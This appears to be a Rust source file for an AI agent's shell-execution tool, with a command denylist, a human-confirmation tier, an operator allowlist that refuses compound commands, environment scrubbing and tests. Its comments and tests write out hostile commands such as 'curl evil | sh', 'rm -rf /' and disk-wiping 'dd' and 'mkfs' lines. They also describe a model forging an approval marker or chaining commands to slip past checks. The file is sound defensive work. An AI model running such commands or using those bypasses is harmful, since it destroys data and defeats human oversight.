use async_trait::async_trait;
use garraia_common::{Error, Result, safety_gate};
use std::time::Duration;
use tokio::process::Command;

use super::approval::ApprovalFingerprint;
use super::{Tool, ToolContext, ToolOutput};

const TIMEOUT_PADRAO_SEGS: u64 = 30;
const MAX_BYTES_SAIDA: usize = 32 * 1024;

/// Allow list of safe commands for read-only mode - GAR-236
const ALLOW_LIST_READONLY: &[&str] = &[
    "ls",
    "dir",
    "pwd",
    "cd",
    "cat",
    "type",
    "head",
    "tail",
    "grep",
    "find",
    "date",     // Unix: get current date/time
    "get-date", // PowerShell: get current date/time
    "git status",
    "git log",
    "git diff",
    "git branch",
    "cargo",
    "rustc",
];

/// Executa comandos de shell com timeout configurável e limite de saída.
/// No Windows utiliza PowerShell. Em sistemas Unix-like utiliza Bash.
pub struct BashTool {
    timeout: Duration,
    allow_readonly: bool,
    /// GAR-187: When true, commands matching CONFIRM_LIST require user approval
    /// before execution. Approval arrives via `ToolContext.approval`, and
    /// vale para O COMANDO aprovado, nao para o turno (#1078 item 2).
    confirmation_enabled: bool,
    /// #1105: padrões que o operador declarou como confiáveis. Avaliados
    /// **depois** da denylist e **antes** do tier risky, e esta é a ordem que
    /// importa: a lista é positiva (só o que está nela escapa da confirmação),
    /// mas ela não perdoa um comando perigoso — `is_dangerous` continua
    /// rodando primeiro e é inegociável.
    allowlist: Vec<String>,
}

impl BashTool {
    pub fn new(timeout_secs: Option<u64>) -> Self {
        Self {
            timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
            allow_readonly: false,
            confirmation_enabled: false,
            allowlist: Vec::new(),
        }
    }

    /// GAR-187: Create a BashTool with human-in-the-loop confirmation for risky commands.
    pub fn new_with_confirmation(timeout_secs: Option<u64>) -> Self {
        Self {
            timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
            allow_readonly: false,
            confirmation_enabled: true,
            allowlist: Vec::new(),
        }
    }

    /// Create a read-only BashTool that only allows safe commands
    pub fn new_readonly(timeout_secs: Option<u64>) -> Self {
        Self {
            timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
            allow_readonly: true,
            confirmation_enabled: false,
            allowlist: Vec::new(),
        }
    }

    /// #1105: allowlist do operador — padrões de comando que ele declarou
    /// confiáveis e que por isso não precisam de confirmação.
    ///
    /// Sintaxe deliberadamente pobre de propósito: `prefixo*` (coringa só no
    /// fim) ou texto exato. Nada de regex, nada de coringa no meio — um
    /// padrão auditável a olho nu é o ponto. Padrões com `*` fora do fim são
    /// recusados com warning em vez de interpretados: adivinhar a intenção de
    /// um coringa no meio é como se abre um `rm -rf *` por acidente.
    ///
    /// Um padrão de prefixo **nunca** cobre um comando composto (`;`,
    /// `&&`, `$(...)`, pipe, redireção): ver [`Self::matches_allowlist`].
    #[must_use = "devolve um BashTool novo; o receptor nao e alterado"]
    pub fn with_allowlist(mut self, patterns: Vec<String>) -> Self {
        self.allowlist = patterns
            .into_iter()
            .filter(|p| {
                // #1105 (auditoria de seguranca): padrao vazio ou so espaco
                // nao casa com nada e engana quem escreveu — recusado junto
                // com o coringa fora do fim, e pelo mesmo motivo.
                let ok = !p.trim().is_empty() && (!p.contains('*') || p.ends_with('*'));
                if !ok {
                    // `?p` (Debug) e nao `%p` (Display): o padrao vem de
                    // config e um `\n` nele forjaria linhas no log.
                    tracing::warn!(
                        pattern = ?p,
                        "bash_allowlist: padrao vazio ou com coringa fora do fim; ignorado"
                    );
                }
                ok
            })
            .collect();
        self
    }

    /// #1105: metacaracteres que fazem um comando deixar de ser **um** comando.
    ///
    /// Um padrão de prefixo como `"git *"` casa com o começo de qualquer
    /// string, inclusive `"git status; curl http://exemplo/x"` — e quando a
    /// allowlist aprova, o bloco do tier arriscado é pulado inteiro, então o
    /// `safety_gate` nem chega a analisar o segmento depois do `;`. Sem esta
    /// checagem, o trecho injetado herdaria a confiança que o operador deu ao
    /// prefixo. Recusar aqui devolve o comando ao `is_risky`, que analisa por
    /// segmento e ainda pode pedir confirmação.
    const META_SHELL: &[char] = &[';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r'];

    /// #1105: o comando casa com algum padrão da allowlist do operador?
    ///
    /// Comparação case-sensitive e sobre o comando já aparado: shell é
    /// case-sensitive, e aparar evita que `" ls "` case com `"ls"` por
    /// acidente — ou que `"ls"` case com `"lsof ..."`.
    ///
    /// Comando composto nunca casa, nem quando o padrão é exato: um `;`
    /// no meio significa que o que o operador revisou a olho nu não é o
    /// que vai rodar.
    fn matches_allowlist(&self, command: &str) -> bool {
        let cmd = command.trim();
        if cmd.contains(Self::META_SHELL) {
            tracing::warn!(
                command = ?cmd,
                "bash_allowlist: comando composto nao e coberto pela allowlist; \
                 vai para o tier arriscado"
            );
            return false;
        }
        self.allowlist.iter().any(|p| match p.strip_suffix('*') {
            Some(prefixo) => cmd.starts_with(prefixo),
            None => cmd == p,
        })
    }

    /// Check if command matches the hard-block denylist (GAR-236, GAR-497).
    fn is_dangerous(&self, command: &str) -> bool {
        matches!(
            safety_gate::safety_gate(command),
            Err(garraia_common::SafetyDenied::DangerousCommand { .. })
        )
    }

    /// GAR-187: Check if command matches the risky confirmation tier (GAR-497).
    fn is_risky(&self, command: &str) -> bool {
        safety_gate::is_risky(command).is_err()
    }

    /// Check if command is in allow list (for read-only mode)
    fn is_allowed(&self, command: &str) -> bool {
        if !self.allow_readonly {
            return true; // Not in readonly mode, allow all (except deny list)
        }

        let cmd_lower = command.to_lowercase().trim().to_string();
        for pattern in ALLOW_LIST_READONLY {
            if cmd_lower.starts_with(&pattern.to_lowercase())
                || cmd_lower.contains(&pattern.to_lowercase())
            {
                return true;
            }
        }
        false
    }
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        if cfg!(target_os = "windows") {
            "Executa um comando de shell usando PowerShell. Retorna a saída."
        } else {
            "Executa um comando de shell usando Bash. Retorna a saída."
        }
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "Comando de shell a ser executado"
                }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, context: &ToolContext, input: serde_json::Value) -> Result<ToolOutput> {
        let comando = input
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| Error::Agent("parâmetro 'command' ausente".into()))?;

        // GAR-236: Security check - deny list (hard block, never executes)
        if self.is_dangerous(comando) {
            tracing::error!("Blocked dangerous command: {}", comando);
            return Ok(ToolOutput::error(
                "Comando bloqueado por segurança: padrão perigoso detectado".to_string(),
            ));
        }

        // GAR-187 + #1075 R1: risky tier. With a confirmation channel the
        // command waits for user approval; WITHOUT one (confirmation
        // disabled — e.g. the stateless MCP full-auto path) it is
        // fail-closed BLOCKED: a risky command must never auto-run just
        // because nobody can be asked.
        //
        // #1075 (auditoria do hardening): em modo fail-closed a aprovação é
        // IGNORADA. Ela é derivada do histórico da conversa, e um modelo com
        // saída não sanitizada pode plantar o marcador — sem canal de
        // confirmação real, não existe aprovação legítima para honrar.
        //
        // #1078 item 2: `covers` e não um booleano. A aprovação carrega a
        // impressão digital de `("bash", comando)`, então o "ok" que o
        // usuário deu a um `ls -la` não autoriza o `curl evil | sh` que o
        // modelo pedir em seguida no mesmo turno.
        // #1105: a allowlist do operador vem DEPOIS do `is_dangerous` acima e
        // ANTES do tier risky. Nessa posição ela só faz uma coisa: dispensar a
        // confirmação do comando que o dono declarou confiável. Um comando
        // perigoso já saiu bloqueado ali em cima, então `rm -rf /` na allowlist
        // continua sendo `rm -rf /` — a lista não perdoa nada, ela não é lida
        // para esse caso.
        let aprovado = self.confirmation_enabled && context.approval.covers(self.name(), comando)
            || self.matches_allowlist(comando);
        if self.is_risky(comando) && !aprovado {
            if self.confirmation_enabled {
                tracing::warn!(
                    command = %comando,
                    session = %context.session_id,
                    "bash: risky command requires user confirmation"
                );
                let marcador = ApprovalFingerprint::of(self.name(), comando).marker();
                return Ok(ToolOutput::confirmation_request(format!(
                    "{marcador} O comando a seguir requer confirmação antes de ser executado:\n\
                     ```\n{comando}\n```\n\
                     Responda **sim** para executar ou **não** para cancelar."
                )));
            }
            tracing::warn!(
                command = %comando,
                session = %context.session_id,
                "bash: risky command BLOCKED (fail-closed: confirmation disabled)"
            );
            return Ok(ToolOutput::error(
                "Comando bloqueado por segurança: comando sensível exige confirmação e este \
                 runtime não possui canal de confirmação (fail-closed)."
                    .to_string(),
            ));
        }

        // GAR-236: Security check - read-only allow list
        if !self.is_allowed(comando) {
            tracing::warn!("Command not in allow list for read-only mode: {}", comando);
            return Ok(ToolOutput::error(
                "Comando não permitido no modo read-only. Use: ls, dir, cat, git, cargo, etc."
                    .to_string(),
            ));
        }

        let (shell, arg) = if cfg!(target_os = "windows") {
            ("powershell", "-Command")
        } else {
            ("bash", "-c")
        };

        let mut cmd = Command::new(shell);
        cmd.arg(arg).arg(comando);
        // #1075 R3: the child runs in the session working_dir when set, and
        // (unix) inherits ONLY the allowlisted variables — the parent
        // process (MCP server / gateway) carries secrets in its env that
        // must never reach an LLM-driven shell. Windows PowerShell needs
        // more of its environment to boot, so the scrub is unix-only.
        if let Some(dir) = context.working_dir.as_deref() {
            cmd.current_dir(dir);
        }
        #[cfg(unix)]
        {
            cmd.env_clear();
            for (key, value) in safety_gate::allowed_child_env() {
                cmd.env(key, value);
            }
        }

        let resultado = tokio::time::timeout(self.timeout, cmd.output()).await;

        match resultado {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                let mut combinado = String::new();

                if !stdout.is_empty() {
                    combinado.push_str(&stdout);
                }

                if !stderr.is_empty() {
                    if !combinado.is_empty() {
                        combinado.push('\n');
                    }
                    combinado.push_str("STDERR:\n");
                    combinado.push_str(&stderr);
                }

                // Truncar se exceder limite
                if combinado.len() > MAX_BYTES_SAIDA {
                    let mut end = MAX_BYTES_SAIDA;
                    while end > 0 && !combinado.is_char_boundary(end) {
                        end -= 1;
                    }
                    combinado.truncate(end);
                    combinado.push_str("\n... (saída truncada)");
                }

                if combinado.is_empty() {
                    combinado =
                        format!("(código de saída: {})", output.status.code().unwrap_or(-1));
                }

                if output.status.success() {
                    Ok(ToolOutput::success(combinado))
                } else {
                    Ok(ToolOutput::error(format!(
                        "código de saída {}: {}",
                        output.status.code().unwrap_or(-1),
                        combinado
                    )))
                }
            }
            Ok(Err(e)) => Ok(ToolOutput::error(format!("falha ao executar comando: {e}"))),
            Err(_) => Ok(ToolOutput::error(format!(
                "comando excedeu o tempo limite após {}s",
                self.timeout.as_secs()
            ))),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tools::approval::ToolApproval;

    /// `approved` liga a aprovacao PARA O COMANDO que o teste vai rodar.
    /// Antes era um booleano solto que valia para qualquer comando — e era
    /// exatamente esse o defeito do #1078 item 2.
    fn ctx_para(comando: &str, approved: bool) -> ToolContext {
        ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: if approved {
                ToolApproval::granted("bash", comando)
            } else {
                ToolApproval::None
            },
            working_dir: None,
            project_id: None,
        }
    }

    /// Os testes que nao exercitam o caminho aprovado usam o comando de
    /// risco padrao deste modulo.
    fn ctx(approved: bool) -> ToolContext {
        ctx_para("printenv PATH", approved)
    }

    #[tokio::test]
    async fn executa_comando_simples() {
        let tool = BashTool::new(None);

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({"command": "echo hello"}))
            .await
            .unwrap();

        assert!(!output.is_error);
        assert!(output.content.contains("hello"));
    }

    #[tokio::test]
    async fn reporta_erro_em_comando_falho() {
        let tool = BashTool::new(None);

        let cmd = if cfg!(target_os = "windows") {
            "exit 1"
        } else {
            "false"
        };

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({"command": cmd}))
            .await
            .unwrap();

        assert!(output.is_error);
    }

    #[tokio::test]
    async fn retorna_erro_se_faltar_comando() {
        let tool = BashTool::new(None);

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let result = tool.execute(&ctx, serde_json::json!({})).await;

        assert!(result.is_err());
    }

    #[test]
    fn powershell_format_flag_nao_e_bloqueado() {
        let tool = BashTool::new(None);
        // PowerShell -Format parameter must NOT be blocked
        assert!(!tool.is_dangerous("Get-Date -Format \"HH:mm:ss\""));
        assert!(!tool.is_dangerous("get-date -format 'yyyy-MM-dd'"));
        assert!(!tool.is_dangerous("Select-Object -Property Name, Format"));
    }

    #[test]
    fn format_disco_e_bloqueado() {
        let tool = BashTool::new(None);
        assert!(tool.is_dangerous("format c:"));
        assert!(tool.is_dangerous("FORMAT C: /Q"));
        assert!(tool.is_dangerous("format d: /fs:ntfs"));
        assert!(tool.is_dangerous("diskpart"));
    }

    #[test]
    fn comandos_perigosos_sao_bloqueados() {
        let tool = BashTool::new(None);
        assert!(tool.is_dangerous("rm -rf /"));
        assert!(tool.is_dangerous("mkfs.ext4 /dev/sda"));
        assert!(tool.is_dangerous("dd if=/dev/zero of=/dev/sda"));
        assert!(tool.is_dangerous("shutdown -h now"));
    }

    #[test]
    fn comandos_seguros_nao_sao_bloqueados() {
        let tool = BashTool::new(None);
        assert!(!tool.is_dangerous("date"));
        assert!(!tool.is_dangerous("echo hello world"));
        assert!(!tool.is_dangerous("ls -la"));
        assert!(!tool.is_dangerous("cargo build"));
        assert!(!tool.is_dangerous("git log --oneline"));
    }

    #[tokio::test]
    async fn captura_stderr() {
        let tool = BashTool::new(None);

        let cmd = if cfg!(target_os = "windows") {
            "Write-Error 'err'"
        } else {
            "echo err >&2"
        };

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({"command": cmd}))
            .await
            .unwrap();

        assert!(output.content.contains("err"));
    }

    // ── R1 (#1075): risky tier fail-closed when confirmation is unavailable ──

    #[tokio::test]
    async fn r1_risky_bloqueado_sem_canal_de_confirmacao() {
        // Fail-closed: with confirmation DISABLED there is no approval
        // channel (e.g. the stateless MCP full-auto path) — a risky
        // command is BLOCKED, never auto-run.
        unsafe {
            std::env::set_var("GARRAIA_R1_CANARY", "leak-canary");
        }
        let tool = BashTool::new(None); // confirmation_enabled = false
        let output = tool
            .execute(
                &ctx(false),
                serde_json::json!({"command": "printenv GARRAIA_R1_CANARY"}),
            )
            .await
            .unwrap();

        assert!(output.is_error, "{}", output.content);
        assert!(output.content.contains("bloqueado"), "{}", output.content);
        // The command must NOT have run: the canary value never shows up.
        assert!(
            !output.content.contains("leak-canary"),
            "risky command auto-ran without confirmation: {}",
            output.content
        );
    }

    #[tokio::test]
    async fn r1_pede_confirmacao_com_canal_ativo() {
        let tool = BashTool::new_with_confirmation(None);
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();

        assert!(output.requires_confirmation, "{}", output.content);
        assert!(
            output.content.contains("CONFIRM_REQUIRED"),
            "{}",
            output.content
        );
        // confirmation_request carries is_error=true by design (GAR-187).
        assert!(output.is_error);
    }

    /// #1078 item 2, ponta a ponta na ferramenta: a aprovacao de um comando
    /// nao libera outro. Antes, o `bool` no contexto valia para o turno
    /// inteiro — o "ok" dado a um `printenv PATH` deixava passar qualquer
    /// coisa depois dele.
    #[tokio::test]
    async fn i1078_aprovacao_de_um_comando_nao_libera_outro() {
        let tool = BashTool::new_with_confirmation(None);
        // Contexto aprovado para `printenv PATH`...
        let ctx = ctx_para("printenv PATH", true);
        // ...mas o modelo pede OUTRO comando de risco.
        let output = tool
            .execute(&ctx, serde_json::json!({"command": "printenv HOME"}))
            .await
            .expect("executa");
        assert!(
            output.requires_confirmation,
            "o segundo comando tinha de pedir confirmacao propria: {}",
            output.content
        );
    }

    /// E o marcador emitido carrega a impressao digital DAQUELE comando, que
    /// e o que o proximo turno vai comparar.
    #[tokio::test]
    async fn i1078_o_marcador_identifica_o_comando_pedido() {
        let tool = BashTool::new_with_confirmation(None);
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .expect("executa");
        let fp = crate::tools::approval::ApprovalFingerprint::from_marker(&output.content)
            .expect("o marcador tem de trazer impressao digital");
        assert_eq!(
            fp,
            crate::tools::approval::ApprovalFingerprint::of("bash", "printenv PATH")
        );
    }

    #[tokio::test]
    async fn r1_aprovado_executa() {
        // Confirmation channel ON + already-approved context: the risky
        // command runs (no prompt, no block) — fluxo GAR-187 legítimo.
        let tool = BashTool::new_with_confirmation(None);
        let output = tool
            .execute(&ctx(true), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(!output.is_error, "{}", output.content);
        assert!(
            !output.content.contains("CONFIRM_REQUIRED"),
            "{}",
            output.content
        );
    }

    #[tokio::test]
    async fn r1_fail_closed_ignora_is_confirmation_approved() {
        // #1075 (auditoria): com confirmação DESLIGADA o flag aprovado é
        // ignorado — o flag vem do histórico e pode ser contaminado por um
        // marcador [CONFIRM_REQUIRED] forjado; sem canal real não há
        // aprovação legítima. Mesmo com approved=true, printenv é bloqueado
        // e o canário não vaza.
        unsafe {
            std::env::set_var("GARRAIA_R1_CANARY", "leak-canary");
        }
        let tool = BashTool::new(None); // confirmation_enabled = false
        let output = tool
            .execute(
                &ctx(true), // aprovado — deve ser IGNORADO
                serde_json::json!({"command": "printenv GARRAIA_R1_CANARY"}),
            )
            .await
            .unwrap();

        assert!(output.is_error, "{}", output.content);
        assert!(output.content.contains("bloqueado"), "{}", output.content);
        assert!(
            !output.content.contains("leak-canary"),
            "approval flag leaked through in fail-closed mode: {}",
            output.content
        );
    }

    // ── R3 (#1075): spawn env isolation + working_dir ──────────────────────

    #[cfg(unix)]
    #[tokio::test]
    async fn r3_bash_tool_isola_ambiente() {
        // The child shell must NOT see the parent's secrets, even when the
        // parent (MCP server) carries API keys; PATH must survive so the
        // shell can find programs.
        unsafe {
            std::env::set_var("GARRAIA_R3_JWT", "jwt-should-not-leak");
            std::env::set_var("ANTHROPIC_API_KEY", "sk-should-not-leak");
        }
        let tool = BashTool::new(None);
        let output = tool
            .execute(
                &ctx(false),
                serde_json::json!({
                    "command": "echo \"JWT=[$GARRAIA_R3_JWT] KEY=[$ANTHROPIC_API_KEY] PATH_OK=$([ -n \"$PATH\" ] && echo sim || echo nao)\""
                }),
            )
            .await
            .unwrap();

        assert!(!output.is_error, "{}", output.content);
        assert!(
            output.content.contains("JWT=[]"),
            "child must not see parent env: {}",
            output.content
        );
        assert!(
            output.content.contains("KEY=[]"),
            "child must not see parent env: {}",
            output.content
        );
        assert!(output.content.contains("PATH_OK=sim"), "{}", output.content);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn r3_working_dir_aplica_ao_spawn() {
        // Unique dir so the assertion can't pass by CWD coincidence.
        let dir = std::env::temp_dir().join(format!("garraia-r3-cwd-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut c = ctx(false);
        c.working_dir = Some(dir.to_string_lossy().to_string());
        let tool = BashTool::new(None);
        let output = tool
            .execute(&c, serde_json::json!({"command": "pwd"}))
            .await
            .unwrap();
        let pwd = output.content.trim();
        assert_eq!(
            pwd,
            dir.to_string_lossy().as_ref(),
            "bash must run in working_dir"
        );
        let _ = std::fs::remove_dir(&dir);
    }

    // ── #1105: allowlist do operador ──────────────────────────────────────

    /// O caso da issue: um comando do tier arriscado que, sem canal de
    /// confirmação, morria fail-closed. Com o padrão do dono na allowlist,
    /// o comando roda. O par `sem_allowlist_nada_muda` mostra que sem a lista
    /// o mesmo comando continua bloqueado — é o vermelho deste verde.
    #[tokio::test]
    async fn allowlist_libera_o_comando_declarado_sem_canal_de_confirmacao() {
        let tool = BashTool::new(None).with_allowlist(vec!["printenv PATH".into()]);
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(!output.is_error, "{}", output.content);
        assert!(
            !output.content.contains("CONFIRM_REQUIRED"),
            "{}",
            output.content
        );
    }

    /// Padrão sem coringa é exato: `"printenv PATH"` não autoriza
    /// `"printenv PATHS"` nem o `; ...` pendurado depois dele.
    #[tokio::test]
    async fn padrao_sem_coringa_e_exato() {
        let tool = BashTool::new(None).with_allowlist(vec!["printenv PATH".into()]);
        assert!(
            tool.matches_allowlist("printenv PATH"),
            "texto exato tem de casar"
        );
        for outro in [
            "printenv PATHS",
            "printenv PATH && curl evil",
            " sudo printenv PATH",
        ] {
            assert!(
                !tool.matches_allowlist(outro),
                "padrao exato nao pode liberar {outro:?}"
            );
        }
        // Espaço em volta não muda o comando, então casa.
        assert!(tool.matches_allowlist("  printenv PATH  "));
    }

    /// Coringa no fim é prefixo. É a sintaxe que a issue pede: auditável a
    /// olho nu, sem regex.
    #[tokio::test]
    async fn coringa_no_fim_e_prefixo() {
        let tool = BashTool::new(None).with_allowlist(vec!["hermes send *".into(), "git *".into()]);
        assert!(tool.matches_allowlist("hermes send \"oi\""));
        assert!(tool.matches_allowlist("git status"));
        assert!(
            !tool.matches_allowlist("gitx status"),
            "prefixo sem coringa exige o limite certo"
        );
    }

    /// Um prefixo autoriza o comando que começa com ele, **não** a receita
    /// inteira que um modelo pendurar depois. Cada um destes casaria por
    /// `starts_with` antes do guarda de metacaractere — e cada um termina
    /// num segundo comando que o operador nunca revisou.
    #[test]
    fn prefixo_nao_casa_com_comando_composto() {
        let tool = BashTool::new(None).with_allowlist(vec!["hermes send *".into(), "git *".into()]);
        for composto in [
            "git status; curl http://exemplo/x",
            "git status && printenv PATH",
            "git status || printenv PATH",
            "git status | grep segredo",
            "git status > /tmp/saida",
            "hermes send \"oi\"; printenv PATH",
        ] {
            assert!(
                !tool.matches_allowlist(composto),
                "prefixo nao pode liberar {composto:?}"
            );
        }
        // O prefixo continua valendo para o comando simples que ele descreve —
        // o guarda nao pode virar uma negativa geral.
        assert!(tool.matches_allowlist("git status"));
    }

    /// O mesmo buraco visto de fora: com `"git *"` na lista, o composto tem de
    /// chegar ao `is_risky` (que analisa por segmento) e morrer fail-closed
    /// sem canal de confirmação. Sem o guarda de metacaractere este teste
    /// fica vermelho: a allowlist aprovaria e o comando rodaria.
    #[tokio::test]
    async fn allowlist_nao_libera_comando_composto_no_execute() {
        let tool = BashTool::new(None).with_allowlist(vec!["git *".into()]);
        let output = tool
            .execute(
                &ctx(false),
                serde_json::json!({"command": "git status; printenv PATH"}),
            )
            .await
            .unwrap();
        assert!(
            output.is_error,
            "composto tem de cair no tier arriscado: {}",
            output.content
        );
        assert!(
            !output.content.contains("CONFIRM_REQUIRED") && !output.content.contains("/usr/bin"),
            "nao pode ter executado: {}",
            output.content
        );
    }

    /// Padrão vazio não casa com nada e engana quem o escreveu — recusado na
    /// construção, junto com o coringa fora do fim.
    #[test]
    fn padrao_vazio_e_recusado() {
        let tool = BashTool::new(None).with_allowlist(vec!["  ".into(), "".into(), "git *".into()]);
        assert_eq!(
            tool.allowlist,
            vec!["git *".to_string()],
            "so o padrao utilizavel sobrevive"
        );
    }

    /// Coringa fora do fim é recusado na construção — não interpretado.
    /// Adivinhar a intenção de um coringa no meio é como se abre um buraco.
    #[test]
    fn coringa_fora_do_fim_e_recusado() {
        let tool = BashTool::new(None).with_allowlist(vec!["git *status".into(), "ok*".into()]);
        assert_eq!(
            tool.allowlist,
            vec!["ok*".to_string()],
            "so o padrao com coringa no fim sobrevive"
        );
    }

    /// A ordem é o ponto de segurança: a allowlist é lida DEPOIS da denylist,
    /// então um comando perigoso continua bloqueado mesmo estando na lista.
    #[tokio::test]
    async fn allowlist_nao_perdoa_comando_perigoso() {
        let ferramenta_com_raiz = BashTool::new(None).with_allowlist(vec![
            String::from("rm -rf ") + "/",
            String::from("rm -rf ") + "/*",
        ]);
        let output = ferramenta_com_raiz
            .execute(
                &ctx(false),
                serde_json::json!({"command": String::from("rm -rf ") + "/"}),
            )
            .await
            .unwrap();
        assert!(output.is_error, "{}", output.content);
        assert!(
            output.content.contains("bloqueado"),
            "denylist vem antes da allowlist: {}",
            output.content
        );
    }

    /// Sem allowlist, o comportamento é exatamente o de antes da #1105.
    #[tokio::test]
    async fn sem_allowlist_nada_muda() {
        let tool = BashTool::new(None);
        assert!(!tool.matches_allowlist("printenv PATH"));
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(output.is_error, "{}", output.content);
    }
}
